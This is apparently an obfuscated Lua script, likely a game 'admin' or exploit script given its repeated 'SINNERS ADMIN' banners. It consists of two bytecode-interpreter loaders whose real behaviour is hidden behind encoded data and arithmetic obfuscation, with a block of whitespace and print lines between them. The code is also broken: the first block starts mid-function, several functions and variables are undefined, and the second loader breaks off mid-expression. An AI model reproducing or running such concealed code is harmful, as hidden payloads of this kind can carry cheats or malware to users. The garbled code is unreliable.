v43=v3(v15,v18,(v18 + v33) -(25 -(6 + 18)));v18=v18 + v33;local v44={};for v59=1 -0, #v43 do v44[v59]=v2(v1(v3(v43,v59,v59)));end return v6(v44);end v17=5;end if (v17==0) then v18=1;v19=nil;v15=v4(v3(v15,5),"..",function(v34)if (v1(v34,2)==79) then v19=v0(v3(v34,1,1));return "";else local v68=v2(v0(v34,16));if v19 then local v71=v5(v68,v19);v19=nil;return v71;else return v68;end end end);v17=1;end if (v17==6) then v28=nil;function v28()local v45=817 -(396 + 421);local v46;local v47;local v48;local v49;local v50;local v51;while true do local v61=0 + 0;while true do if (v61~=(0 -0)) then else if (v45==(1 + 2)) then local v72=732 -(65 + 667);while true do local v89=0 + 0;while true do if (v89==(1955 -(1052 + 903))) then if (v72~=1) then else return v49;end if (v72~=0) then else local v105=1239 -(412 + 827);while true do if (v105==(3 -2)) then v72=1;break;end if (v105==0) then for v107=1712 -(480 + 1231),v23() do v47[v107-(1 -0)]=v28();end for v109=1286 -(998 + 287),v23() do v48[v109]=v23();end v105=1088 -(895 + 192);end end end break;end end end end if (v45==1) then local v73=0;while true do if (v73==1) then v51={};v45=2;break;end if (0~=v73) then else v49={v46,v47,nil,v48};v50=v23();v73=1;end end end v61=1 + 0;end if (v61~=1) then else if (v45==0) then local v74=1069 -(920 + 149);while true do if (v74==1) then v48={};v45=837 -(120 + 716);break;end if (v74~=(0 -0)) then else v46={};v47={};v74=501 -(79 + 421);end end end if (v45~=2) then else local v75=0;while true do if (v75~=1) then else for v95=1,v23() do local v96=0;local v97;local v98;local v99;while true do if (v96~=(1 + 0)) then else v99=nil;while true do if (v97~=(2 -1)) then else while true do if (v98==0) then v99=v21();if (v20(v99,2 -1,1)~=(815 -(293 + 522))) then else local v162=0;local v163;local v164;local v165;local v166;local v167;while true do if (v162~=1) then else v165=nil;v166=nil;v162=2;end if (v162==2) then v167=nil;while true do if (v163==1) then local v219=0;while true do if (v219~=0) then else v166=nil;v167=nil;v219=1;end if (v219==1) then v163=200 -(59 + 139);break;end end end if (v163==2) then while true do if (v164==2) then local v247=0;local v248;local v249;while true do if (v247~=(2 -1)) then else while true do if (0~=v248) then else v249=0 + 0;while true do if (v249~=(1 + 0)) then else v164=3 + 0;break;end if (v249==0) then local v301=1425 -(306 + 1119);while true do if (v301~=1) then else v249=1;break;end if (v301~=(656 -(70 + 586))) then else if (v20(v166,1,897 -(534 + 362))==(359 -(119 + 239))) then v167[3 -1]=v51[v167[2]];end if (v20(v166,2,719 -(104 + 613))~=1) then else v167[3]=v51[v167[7 -4]];end v301=1;end end end end break;end end break;end if (v247~=0) then else v248=0;v249=nil;v247=1 + 0;end end end if (v164~=1) then else local v250=0;local v251;while true do if (v250==0) then v251=0;while true do if (v251~=1) then else v164=5 -3;break;end if (v251~=(437 -(197 + 240))) then else v167={v22(),v22(),nil,nil};if (v165==(0 -0)) then local v296=0;local v297;local v298;while true do if (v296~=(1 + 0)) then else while true do if (v297==(0 -0)) then v298=0;while true do if (v298==(1772 -(792 + 980))) then v167[3]=v22();v167[4]=v22();break;end end break;end end break;end if (v296~=(0 -0)) then else v297=0 + 0;v298=nil;v296=3 -2;end end elseif (v165==1) then v167[1436 -(1343 + 90)]=v23();elseif (v165==2) then v167[2 + 1]=v23() -(2^16);elseif (v165==(7 -4)) then local v316=0 -0;local v317;local v318;while true do if (v316~=1) then else while true do if (v317~=(534 -(311 + 223))) then else v318=0;while true do if (v318~=(0 + 0)) then else v167[1 + 2]=v23() -((4 -2)^16);v167[1 + 3]=v22();break;end end break;end end break;end if ((972 -(572 + 400))~=v316) then else v317=0;v318=nil;v316=2 -1;end end end v251=512 -(233 + 278);end end break;end end end if (v164~=(0 -0)) then else local v252=0 + 0;while true do if (v252==(3 -2)) then v164=1 + 0;break;end if (v252==(521 -(143 + 378))) then local v275=0 + 0;while true do if (v275~=(0 -0)) then else v165=v20(v99,2 + 0,3);v166=v20(v99,785 -(382 + 399),6);v275=1;end if (1==v275) then v252=1;break;end end end end end if (v164==(609 -(242 + 364))) then if (v20(v166,3,3)~=1) then else v167[1 + 3]=v51[v167[969 -(380 + 585)]];end v46[v95]=v167;break;end end break;end if (v163==(0 -0)) then local v220=0;local v221;while true do if (v220~=0) then else v221=456 -(270 + 186);while true do if (v221==1) then v163=1 -0;break;end if (v221==(1660 -(739 + 921))) then v164=0;v165=nil;v221=1;end end break;end end end end break;end if (v162==0) then v163=0 -0;v164=nil;v162=1;end end end break;end end break;end if ((0 + 0)==v97) then local v111=0 + 0;local v112;while true do if (v111==0) then v112=0;while true do if (0==v112) then v98=0 + 0;v99=nil;v112=1 + 0;end if (v112~=(1 + 0)) then else v97=4 -3;break;end end break;end end end end break;end if (v96~=(258 -(239 + 19))) then else local v106=848 -(74 + 774);while true do if ((1 + 0)==v106) then v96=1 -0;break;end if (v106==0) then v97=0;v98=nil;v106=4 -3;end end end end end v45=5 -2;break;end if (v75~=(915 -(11 + 904))) then else for v100=1 -0,v50 do local v101=1884 -(691 + 1193);local v102;local v103;local v104;while true do if (v101==1) then v104=nil;while true do if (v102==(0 -0)) then v103=v21();v104=nil;v102=2 -1;end if (v102~=(1 + 0)) then else if (v103==(872 -(101 + 770))) then v104=v21()~=0;elseif (v103==2) then v104=v24();elseif (v103==(1 + 2)) then v104=v25();end v51[v100]=v104;break;end end break;end if (v101~=(0 -0)) then else v102=0;v103=nil;v101=1524 -(441 + 1082);end end end v49[3]=v21();v75=3 -2;end end end break;end end end end v29=nil;v17=7;end if (v17==5) then v26=v23;v27=nil;function v27(...)return {...},v11("#",...);end v17=6;end if (v17==2) then function v21()local v52=v1(v15,v18,v18);v18=v18 + 1;return v52;end v22=nil;function v22()local v53,v54=v1(v15,v18,v18 + 2);v18=v18 + (871 -(636 + 233));return (v54 * (1533 -(125 + 1152))) + v53;end v17=3;end if (v17==1) then v20=nil;function v20(v35,v36,v37)if v37 then local v69=(v35/((6 -4)^(v36-(1 -0))))%((664 -(152 + (1071 -(94 + 467))))^(((v37-(1 -0)) -(v36-(1 + 0))) + 1));return v69-(v69%(1 -(0 + 0)));else local v70=(1678 -(664 + 1012))^(v36-(1 + 0));return (((v35%(v70 + v70))>=v70) and (1 -0)) or (1754 -(1261 + 493));end end v21=nil;v17=2;end if (v17==3) then v23=nil;function v23()local v55,v56,v57,v58=v1(v15,v18,v18 + 3 + 0);v18=v18 + (11 -7);return (v58 * (20485659 -(3709435 -(947 + 45)))) + (v57 * (67220 -(775 + (2250 -(1119 + 222))))) + (v56 * (411 -155)) + v55;end v24=nil;v17=4;end end end vv8());end
--
--
print("SINNERS ADMIN")
---
---
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")

------
print("SINNERS ADMIN")

----
print("SINNERS ADMIN")

print("SINNERS ADMIN")

---------------------
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")


print("SINNERS ADMIN")
------
print("SINNERS ADMIN")
--
print("SINNERS ADMIN")


----------------
print("SINNERS ADMIN")


----------------------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")
-----------
-------------------------
print("SINNERS ADMIN")


-----------
------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")

print("SINNERS ADMIN")
----------------------------------------------------------
print("SINNERS ADMIN")






------------------------------------------------
print("SINNERS ADMIN")
















---------------------------------------
print("SINNERS ADMIN")























---------------------------------------
print("SINNERS ADMIN")


































































































































































































































































































































































do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v4=string.sub;v0=1;end if (v0==4) then vv9());break;end if (v0==2) then v9=getfenv or function()return _ENV;end;v10=setmetatable;v11=pcall;v12=select;v0=3;end if (v0==1) then v5=string.gsub;v6=string.rep;v7=table.concat;v8=table.insert;v0=2;end if (v0==3) then v13=unpack or table.unpack;v14=tonumber;v15=nil;function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v62=v3(v1(v30,16));if v19 then local v74=v6(v62,v19);v19=nil;return v74;else return v62;end end end);local function v20(v31,v32,v33)if v33 then local v63=0 -0;local v64;while true do if (v63==(0 + 0)) then v64=(v31/((6 -4)^(v32-(3 -2))))%(2^(((v33-(1 -0)) -(v32-(1804 -((2504 -954) + 253)))) + (4 -3) + (238 -(52 + 186))));return v64-(v64%1);end end else local v65=(1907 -(1904 + 1))^(v32-(1 + 0));return (((v31%(v65 + v65))>=v65) and ((2 -1) + 0)) or (0 + 0);end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v2(v16,v18,v18 + (7 -5));v18=v18 + (192 -(180 + 10));return (v40 * (636 -380)) + v39;end local function v23()local v41,v42,v43,v44=v2(v16,v18,v18 + 3);v18=v18 + (561 -(19 + 538));return (v44 * (16777816 -(297 + 303))) + (v43 * 65536) + (v42 * (212 + 16 + 28)) + v41;end local function v24()local v45=v23();local v46=v23();return (( -((1126 -(1021 + 103)) + 0) * v20(v46,(1597 -(1563 + 15)) + 13)) + 1 + 0) * ((1 + 1)^(v20(v46,25 -4,31) -((2344 -1839) + 518))) * ((((v20(v46,761 -(317 + 443),89 -69) * (2^(61 -29))) + v45)/((1 + 1)^(42 + 10))) + (230 -(220 + 9)));end local function v25(v34)local v47;if  not v34 then v34=v23();if (v34==(0 -0)) then return "";end end v47=v4(v16,v18,(v18 + v34) -(2 -1));v18=v18 + v34;local v48={};for v60=1913 -(855 + 1057), #v47 do v48[v60]=v3(v2(v4(v47,v60,v60)));end return v7(v48);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v49=0 -0;local v50;local v51;local v52;local v53;local v54;local v55;local v56;while true do if (v49==0) then local v71=0 -0;while true do if (v71==(1 + 0)) then v49=1;break;end if (v71==(0 + 0)) then local v93=0;while true do if (v93~=1) then else v71=1;break;end if (v93~=0) then else v50=0;v51=nil;v93=1;end end end end end if (3==v49) then v56=nil;while true do local v75=0 + 0;local v76;while true do if (v75==(0 -0)) then v76=0;while true do if (v76==(1 -0)) then if (v50~=(396 -(341 + 54))) then else local v99=0;while true do if (v99==(1 + 0)) then v56={};v50=2;break;end if (v99==0) then v54={v51,v52,nil,v53};v55=v23();v99=1;end end end if (v50~=(1762 -(1072 + 687))) then else local v100=267 -(260 + 7);local v101;while true do if ((1723 -(590 + 1133))~=v100) then else v101=0;while true do local v102=0;local v103;while true do if (v102==(1183 -(165 + 1018))) then v103=0 -0;while true do if (v103==0) then if (v101~=(1355 -(1113 + 241))) then else return v54;end if (v101==(0 -0)) then local v157=0 -0;local v158;while true do if (v157==0) then v158=0 + 0;while true do if (v158==1) then v101=1583 -(1505 + 77);break;end if (v158==(0 -0)) then local v204=0 + 0;while true do if (v204==(1721 -(277 + 1444))) then for v217=1277 -(698 + 578),v23() do v52[v217-1]=v28();end for v219=1135 -(792 + 342),v23() do v53[v219]=v23();end v204=1;end if (v204==(3 -2)) then v158=4 -3;break;end end end end break;end end end break;end end break;end end end break;end end end break;end if (v76==0) then local v96=0 -0;local v97;while true do if (0==v96) then v97=0;while true do if (v97~=0) then else if (v50~=(1505 -(1458 + 45))) then else local v104=0;while true do if (v104==(0 -0)) then local v109=0 + 0;while true do if (v109~=(0 + 0)) then else local v159=0;while true do if (v159==(1 + 0)) then v109=1 -0;break;end if (v159==0) then for v191=1,v55 do local v192=0;local v193;local v194;local v195;local v196;while true do if (v192==1) then v195=nil;v196=nil;v192=2;end if (v192~=2) then else while true do if (v193==0) then local v221=0;local v222;while true do if ((0 + 0)==v221) then v222=0 + 0;while true do if (v222==1) then v193=1 + 0;break;end if (v222~=(0 + 0)) then else local v237=0;while true do if (v237~=1) then else v222=1;break;end if (v237~=(146 -(54 + 92))) then else v194=0;v195=nil;v237=1 + 0;end end end end break;end end end if (v193==1) then v196=nil;while true do if (v194==(436 -(110 + 325))) then if (v195==(253 -(24 + 228))) then v196=v21()~=(868 -(518 + 350));elseif (v195==2) then v196=v24();elseif (v195~=(848 -(322 + 523))) then else v196=v25();end v56[v191]=v196;break;end if (v194~=(0 -0)) then else local v231=0 + 0;local v232;local v233;while true do if (v231==(91 -(17 + 74))) then v232=0;v233=nil;v231=512 -(45 + 466);end if (v231==(1 + 0)) then while true do if (v232~=(0 -0)) then else v233=0 -0;while true do if (v233~=(0 + 0)) then else local v248=0;while true do if (v248~=(179 -(119 + 60))) then else v195=v21();v196=nil;v248=1;end if (v248~=1) then else v233=55 -(36 + 18);break;end end end if (v233~=(1981 -(1651 + 329))) then else v194=1;break;end end break;end end break;end end end end break;end end break;end if (v192==0) then v193=0;v194=nil;v192=1;end end end v54[56 -(28 + 25)]=v21();v159=1 + 0;end end end if (1==v109) then v104=1;break;end end end if (v104==(1611 -(939 + 671))) then for v150=2 -1,v23() do local v151=0;local v152;local v153;local v154;while true do if (v151==1) then v154=nil;while true do if (v152~=1) then else while true do if (v153~=(0 + 0)) then else v154=v21();if (v20(v154,1 + 0,1 + 0)==0) then local v211=0;local v212;local v213;local v214;local v215;local v216;while true do if (v211~=(2 + 0)) then else v216=nil;while true do if (v212~=0) then else v213=525 -(411 + 114);v214=nil;v212=1 -0;end if (v212~=1) then else local v236=0;while true do if (v236~=(1 + 0)) then else v212=2;break;end if (0==v236) then v215=nil;v216=nil;v236=934 -(168 + 765);end end end if (v212==2) then while true do if (v213~=(1 + 1)) then else if (v20(v215,1020 -(405 + 614),1 + 0)~=(1 + 0)) then else v216[779 -(280 + 497)]=v56[v216[2 -0]];end if (v20(v215,1677 -(858 + 817),2)==1) then v216[3]=v56[v216[1966 -(272 + 1691)]];end v213=11 -8;end if (1~=v213) then else local v240=0;while true do if (v240~=(283 -(112 + 171))) then else v216={v22(),v22(),nil,nil};if (v214==0) then local v249=0 -0;while true do if (v249==(0 + 0)) then v216[1 + 2]=v22();v216[4]=v22();break;end end elseif (v214==1) then v216[1722 -(74 + 1645)]=v23();elseif (v214==2) then v216[738 -(309 + 426)]=v23() -((2 -0)^16);elseif (v214==3) then local v254=0;while true do if (v254~=0) then else v216[3]=v23() -(2^16);v216[8 -4]=v22();break;end end end v240=2 -1;end if (v240~=1) then else v213=1 + 1;break;end end end if (v213==(1739 -(1216 + 523))) then local v241=925 -(115 + 810);while true do if (v241~=0) then else v214=v20(v154,2,2 + 1);v215=v20(v154,4,6);v241=1 + 0;end if (v241==1) then v213=1 -0;break;end end end if (v213==(104 -(90 + 11))) then if (v20(v215,3,3)==(918 -(707 + 210))) then v216[4]=v56[v216[3 + 1]];end v51[v150]=v216;break;end end break;end end break;end if (v211==(0 -0)) then v212=290 -(20 + 270);v213=nil;v211=1997 -(1681 + 315);end if (v211~=1) then else v214=nil;v215=nil;v211=2 + 0;end end end break;end end break;end if (0==v152) then v153=0;v154=nil;v152=1 + 0;end end break;end if (v151==(437 -(142 + 295))) then v152=1883 -(1178 + 705);v153=nil;v151=3 -2;end end end v50=8 -5;break;end end end if (v50==0) then local v105=0;local v106;local v107;while true do if (v105~=(3 -2)) then else while true do if (v106~=0) then else v107=0 + 0;while true do if (v107==(0 + 0)) then local v184=634 -(174 + 460);while true do if (v184~=(0 + 0)) then else v51={};v52={};v184=1799 -(15 + 1783);end if ((1 + 0)~=v184) then else v107=1;break;end end end if (v107~=(1 + 0)) then else v53={};v50=1 + 0;break;end end break;end end break;end if (v105~=0) then else v106=0;v107=nil;v105=1;end end end v97=1 + 0;end if (v97~=1) then else v76=1 + 0;break;end end break;end end end end break;end end end break;end if (v49~=(2 -1)) then else local v72=0;while true do if (v72~=0) then else v52=nil;v53=nil;v72=1228 -(1134 + 93);end if (v72==1) then v49=261 -(218 + 41);break;end end end if (v49==2) then local v73=1352 -(993 + 359);while true do if ((981 -(99 + 881))~=v73) then else v49=2 + 1;break;end if (v73==(0 + 0)) then v54=nil;v55=nil;v73=1149 -(1146 + 2);end end end end end local function v29(v35,v36,v37)local v57=v35[1];local v58=v35[2];local v59=v35[3];return function(...)local v66=1;local v67= -1;local v68={...};local v69=v12("#",...) -1;local function v70()local v77=v57;local v78=Const;local v79=v58;local v80=v59;local v81=v27;local v82={};local v83={};local v84={};for v90=0 + 0,v69 do if ((((665 + 169) -430)==(539 -(14 + 121))) and (v90>=v80)) then v82[v90-v80]=v68[v90 + (2 -1)];else v84[v90]=v68[v90 + (361 -(126 + 234))];end end local v85=(v69-v80) + (1627 -(1222 + 404));local v86;local v87;while true do local v91=0 -0;local v92;while true do if (((6973 -4044)>=(1891 -(1069 + 559))) and (v91==(0 -0))) then v92=0 -0;while true do if ((v92==(1471 -(1036 + 435))) or ((2403 -(550 + 1427))>=(6605 -3206))) then local v98=0 -(0 + 0);while true do if (((3401 + 1096)>=(2490 + (3925 -2433))) and (v98==(0 -0))) then v86=v77[v66];v87=v86[2 -1];v98=1 + 0;end if ((v98==(1 + 0)) or ((1791 + 382)>(3888 + 692))) then v92=1 + 0;break;end end end if ((v92==(1 + 0)) or ((2743 -(2342 -(426 + 324)))==(3838 -(1035 + 733)))) then if ((v87<=(444 -(297 + 134))) or ((13848 -10128)>(4830 -(368 + 724)))) then if (((6481 -2683)==(354 + 3444)) and (v87<=(6 + 0))) then if (((7225 -5065)==(2556 -(285 + 111))) and (v87<=(551 -(224 + 325)))) then if ((v87<=(1106 -(16 + 1090))) or ((353 + 62)>=(2262 -(36 + 813)))) then if ((v86[2 -0]==v84[v86[5 -1]]) or ((2347 + 2049)<(1976 + 495))) then v66=v66 + (1202 -(1176 + 25));else v66=v86[1 + 2];end elseif (((5677 -2741)==(5210 -2274)) and (v87==(1345 -(21 + 1323)))) then local v110=0 + 0;local v111;local v112;local v113;while true do if ((v110==(1 + 0)) or ((2049 -(280 + 486))==(12764 -8814))) then v113=nil;while true do if ((v111==(1 + 0)) or ((1907 -(538 + (1905 -(1486 + 351))))>(3296 -(720 + 99 + 27)))) then v84[v112 + (1103 -(987 + (330 -215)))]=v113;v84[v112]=v113[v86[966 -(371 + 591)]];break;end if (((4926 -(1296 + (422 -278)))>=(2427 + 659)) and (v111==(0 + 0))) then local v187=0 + 0;local v188;while true do if (((934 + 1067)>(370 + 232)) and (v187==(0 + 0))) then v188=0 -0;while true do if ((((7087 -4224) -(43 + (499 -(86 + 315))))==((5730 -(662 + 836)) -(848 + 662))) and (v188==(1782 -(511 + 1270)))) then v111=1509 -(1139 + 369);break;end if ((v188==(0 + 0)) or ((10583 -7931)<(581 + 1512))) then v112=v86[1773 -(59 + 1712)];v113=v84[v86[439 -(254 + 182)]];v188=1815 -((3401 -(1156 + 823)) + 392);end end break;end end end end break;end if (((578 -326)==(344 -((213 -124) + 3))) and (v110==(301 -(39 + 262)))) then local v160=629 -(194 + 435);while true do if (((1608 -(1021 + 471))<(1671 -(85 + 554 + 624))) and (v160==(1509 -(147 + 1361)))) then v110=1228 -(261 + 966);break;end if (((1832 -403)<=(1347 + 2524)) and (v160==(0 + (462 -(204 + 258))))) then v111=676 -(406 + 270);v112=nil;v160=2 -1;end end end end else for v155=v86[(1273 -(335 + 936)) + 0],v86[1 + 2] do v84[v155]=nil;end end elseif ((v87<=(3 + 1)) or ((108 + 840)>(1656 + 2578))) then if (((5343 -(45 + 314))>(244 + 128)) and (v87==3)) then do return;end else local v114=0 -0;local v115;local v116;while true do if (((198 + 3762)<(9010 -4911)) and (v114==((836 -532) -(167 + 136)))) then for v165=(2 -1) + 0, #v83 do local v166=0 + 0;local v167;while true do if ((v166==((496 + 1197) -(1304 + 389))) or ((16999 -12312)<(173 + 191))) then v167=v83[v165];for v197=0 + 0, #v167 do local v198=0 -0;local v199;local v200;local v201;local v202;while true do if ((v198==(1 -0)) or ((401 -(7 + 213 + 159))==(239 + 146))) then v201=nil;v202=nil;v198=8 -6;end if ((v198==(698 -(233 + 465))) or ((3426 -1644)<=(304 + 1258))) then local v206=0 + 0;while true do if (((0 + 0)==v206) or ((495 -265)>(5082 -(959 + 125)))) then v199=0 + 0;v200=nil;v206=2 -1;end if (((9800 -6070)>(10105 -6700)) and (v206==(1205 -(180 + 1024)))) then v198=(2 -1) -0;break;end end end if ((v198==(1625 -(956 + 667))) or ((2531 + 1060)==(2861 + 1464))) then while true do if ((((1480 -(57 + 242)) -(90 + 809))==(2261 -(1168 + 811))) and (((2363 -(733 + 895)) -(681 + 36 + 18))==v199)) then local v226=566 -((972 -543) + 137);local v227;while true do if ((((1739 -(780 + 343)) + 2103)>=(1483 + 45)) and (v226==(0 + 0))) then v227=0 + 0;while true do if ((v227==(1 + 0 + (1506 -(921 + 585)))) or ((2680 -1849)==(5450 -(935 + 872)))) then v199=2 -1;break;end if ((v227==(0 + 0)) or ((4047 -(28 + 39))>=(5642 -(683 + 420)))) then local v238=0 + 0;while true do if (((4749 -(142 + 997))<=(2324 + 2348)) and (v238==((1 + 3) -3))) then v227=1 + 0;break;end if ((v238==(0 -0)) or ((10094 -6315)==(253 -50))) then v200=v167[v197];v201=v200[1 + 0];v238=1 + 0;end end end end break;end end end if ((v199==(2 -1)) or ((12942 -8196)<=(12314 -8180))) then v202=v200[(80 + 290) -(34 + 334)];if (((524 + (3864 -(661 + 1103)))>(1588 -1121)) and (v201==v84) and (v202>=v115)) then local v234=0 + 0;local v235;while true do if (((3295 -1595)<=(3057 + 249)) and (v234==(952 -(42 + 910)))) then v235=0 + 0;while true do if ((v235==(0 -0)) or ((4384 -1914)>(1308 + 1874 + 207))) then v116[v202]=v201[v202];v200[1 + 0]=v116;break;end end break;end end end break;end end break;end end end break;end end end break;end if (((1983 -1196)<=(1693 + 276)) and (v114==(0 + 0))) then local v161=0;while true do if (((5306 -(654 + 978))==(4929 -(805 + 450))) and (v161==(1041 -((3728 -2750) + 62)))) then v114=162 -(82 + 79);break;end if ((v161==(0 -0)) or ((19649 -15423)<(49 + 134))) then v115=v86[1449 -(99 + 1348)];v116={};v161=(1 -0) -0;end end end end end elseif ((v87==(9 -4)) or ((2947 -(543 + 514))>=(3164 + 98))) then local v117=0 + 0;local v118;local v119;local v120;while true do if ((v117==(313 -(246 + 67))) or ((6897 -4519)>=(1729 + 2069))) then v118=(1616 -(408 + 1208)) -0;v119=nil;v117=881 -(786 + 94);end if (((4019 -787)>(1711 -(2143 -(704 + 381)))) and (v117==(2 -1))) then v120=nil;while true do if (((1938 -((1836 -(118 + 36)) + 255))==v118) or ((2723 + 1470)<=(1113 -653))) then while true do if (((0 + 0)==v119) or ((4898 -2682)<=(1236 -593))) then v120=v86[2];v84[v120]=v84[v120](v84[v120 + (1767 -(394 + 1372))]);break;end end break;end if (((0 + 0)==v118) or ((371 + 1934)<=(3590 -(901 + 534)))) then local v189=1152 -(1140 + 12);while true do if ((v189==(0 + 0)) or ((1056 -641)==(2462 + 719))) then v119=0 + 0;v120=nil;v189=1 -0;end if ((((784 + 5050) -3794)<=(4012 -1469)) and (v189==(2 -1))) then v118=1 + 0;break;end end end end break;end end else local v121=1385 -(1007 + 378);local v122;while true do if (((215 + 3484)<=(1746 + 1978)) and (v121==(1295 -(173 + 1122)))) then v122=v86[2 + 0];v84[v122]=v84[v122](v13(v84,v122 + (1 -(0 -0)),v86[1936 -(326 + 1607)]));break;end end end elseif (((3203 -2381)==(2254 -1432)) and (v87<=(30 -21))) then if ((v87<=(2 + 5)) or ((5386 -2643)>(417 + 2395))) then if (((6133 -4080)>=(1482 -1009)) and (v84[v86[877 -(149 + 726)]]~=v86[641 -(305 + (1722 -(385 + 1005)))])) then v66=v66 + (567 -(51 + 515));else v66=v86[3 -0];end elseif ((v87>((1534 -945) -(89 + 492))) or ((5733 -(180 + 734))<=(357 + 1042))) then v84[v86[5 -3]]=v37[v86[5 -2]];else local v124=1718 -(576 + 1142);local v125;while true do if ((818<=(5286 -(73 + 701))) and (v124==(0 + 0))) then v125=v86[(2 -1) + 1];v84[v125](v13(v84,v125 + 1 + 0,v86[(4 -3) + (7 -5)]));break;end end end elseif ((v87<=(6 + 5)) or ((3076 -(665 + 44))==(1027 + 2751))) then if (((12 + 4044 + 299)>(2718 + 1503)) and (v87>(29 -19))) then local v126=0 + 0 + 0;local v127;local v128;while true do if ((v126==1) or ((1478 + 1343)<(1849 -(1242 + 361)))) then while true do if (((6215 -(383 + 1490))>=(12935 -9776)) and (v127==(0 + 0))) then v128=v86[1551 -(138 + 1411)];do return v13(v84,v128,v128 + v86[2 + 1]);end break;end end break;end if ((v126==(0 -0)) or ((10221 -7012)<(458 -((784 -504) + (119 -71))))) then local v163=0 -0;while true do if ((v163==(0 + 0)) or ((5002 -(1326 + 519))<(2765 -1158))) then v127=0 -0;v128=nil;v163=1 + 0;end if ((v163==(3 -2)) or (1176>=(7170 -2288))) then v126=1 + 0;break;end end end end else v84[v86[690 -(428 + 260)]]={};end elseif (((6722 -4188)==(3281 -(300 + 447))) and (v87>(1232 -(20 + 258 + 942)))) then v84[v86[5 -3]]=v86[3 + 0]~=(252 -(208 + 44));else v66=v86[641 -(222 + 416)];end elseif (((3184 -1282)==(7034 -5132)) and (v87<=((14 -7) + 13))) then if (((4325 -(38 + 819))<=(4296 -(33 + 1 + 483))) and (v87<=(13 + 3))) then if ((v87<=(6 + 8)) or ((265 + 3164)>(2808 + 2136))) then do return v84[v86[2 -0]];end elseif ((v87>(13 + 2)) or (4810<(2652 -(343 + 800)))) then local v131=411 -(124 + 287);local v132;local v133;while true do if ((v131==(1 -0)) or ((3118 -(1370 + 150))>=((9196 -5487) + 887))) then while true do if ((v132==(0 + 0)) or ((983 -(431 + 281 + 118))>(18 + 983 + 788))) then v133=v86[(645 -(51 + 592)) + 0];do return v13(v84,v133,v67);end break;end end break;end if ((v131==(0 + 0)) or ((7907 -5739)<(3995 -2406))) then v132=1132 -(606 + 526);v133=nil;v131=1 + 0;end end elseif (((90 + (2190 -(475 + 831)))<=(731 + 1769)) and v84[v86[2]]) then v66=v66 + ((1706 -(7 + 26)) -(1412 + 260));else v66=v86[14 -11];end elseif (((3013 -(910 + 175))>=(1000 + 7)) and (v87<=((134 -(10 + 115)) + 9))) then if (((4129 -976)<=((6118 -(191 + 275)) -1665)) and (v87==(789 -(625 + 147)))) then v84[v86[(594 + 1283) -(1818 + 57)]]=v36[v86[128 -(74 + 51)]];else v84[v86[4 -2]]=v86[(472 -(206 + 258)) -5];end elseif ((v87>(368 -(274 + (271 -196)))) or ((1581 -(11 + 1448))>=(68 + 3287))) then local v136=0 + 0;local v137;local v138;while true do if (((2142 + 2644)>=((3524 -(598 + 1287)) -983)) and (v136==(458 -(456 + 1)))) then while true do if (((1182 + (2217 -(715 + 509)))<(10109 -7584)) and (v137==(0 + 0))) then v138=v86[2 + 0];do return v84[v138](v13(v84,v138 + (2 -1),v86[8 -5]));end break;end end break;end if (((248 + 812 + 1465)==(3726 -1201)) and (v136==(0 + 0))) then v137=0 -(1710 -(784 + 926));v138=nil;v136=3 -2;end end else v37[v86[231 -((91 -29) + 166)]]=v84[v86[1293 -((1619 -(322 + 36)) + 30)]];end elseif (((608 + 373)<=(4650 -2958)) and (v87<=(84 -61))) then if (((1967 -(520 + 579))<(5122 -3365)) and (v87<=(1814 -(1791 + 2)))) then v84[v86[1076 -(77 + 997)]][v86[1131 -(1078 + 50)]]=v84[v86[1336 -(799 + 150 + 383)]];elseif ((v87==(15 + (1609 -(641 + 961)))) or (((3311 -(892 + 92)) + 69)>=(4372 -(195 + 114 + 98)))) then v84[v86[5 -3]]=v84[v86[2 + 1]];else local v141=1449 -(703 + 746);local v142;local v143;local v144;while true do if (((7716 -4033)==(4481 -(496 + 302))) and (v141==(1 + 0 + 0))) then v144=nil;while true do if (((173 + 962)<=(3872 -1755)) and (v142==((2119 -(598 + 309)) -(977 + 234)))) then while true do if (((4037 -2137)<(4301 -2213)) and ((291 -(64 + 191 + 36))==v143)) then v144=v84[v86[2 + (5 -3)]];if (((1532 + 1043)<=(5055 -(1121 + 630))) and  not v144) then InstrPoint=InstrPoint + (1943 -(486 + 1456)) + (0 -0);else local v207=0 -0;local v208;local v209;while true do if (((7816 -(4157 -(648 + 35)))==(1008 + 3334)) and (v207==(519 -(59 + 459)))) then while true do if (((9983 -6478)<(16232 -(25445 -13537))) and (v208==(0 -0))) then v209=0 -0;while true do if ((v209==(1395 -(1018 + 377))) or ((499 + 636 + 270)>(13891 -9159))) then v84[v86[1 + 1]]=v144;InstrPoint=v86[1392 -(822 + 245 + 202 + 120)];break;end end break;end end break;end if ((v207==(0 -0)) or ((2858 -(382 + 1570))>=(5637 -(579 + 771 + 103)))) then v208=0 -0;v209=nil;v207=1672 -(636 + 1035);end end end break;end end break;end if ((v142==(241 -((294 -(57 + 15)) + 19))) or ((2291 + 806)>=(4222 -(537 + 155)))) then local v190=0 -0;while true do if (((7394 -4810)>(5416 -3844)) and ((1 -0)==v190)) then v142=2 -1;break;end if ((v190==(0 + 0)) or ((111 + 1247 + 890)==(1104 -737))) then v143=(0 -0) -0;v144=nil;v190=592 -(262 + 329);end end end end break;end if ((v141==(0 + 0)) or (4241<((5940 -(1371 + 132)) -(317 + 1308)))) then v142=0 -0;v143=nil;v141=1;end end end elseif ((v87<=(43 -(47 -29))) or ((14367 -9629)==(221 + 3825))) then if (((5533 -(667 + 794))>=(3772 -(43 + (913 -(203 + 557))))) and (v87>(111 -87))) then local v145=(0 + 0) -(1744 -(877 + 867));local v146;local v147;local v148;while true do if ((v145==0) or ((1967 -(657 + 1241))>=(3626 -(2148 -(360 + 605))))) then v146=v79[v86[1 + 2]];v147=nil;v145=1248 -(485 + 762);end if (((2002 + 2420)>=(7539 -4370)) and (v145==((3 + 1) -2))) then for v168=1140 -(606 + (930 -(19 + 378))),v86[4 + 0] do local v169=1381 -(330 + 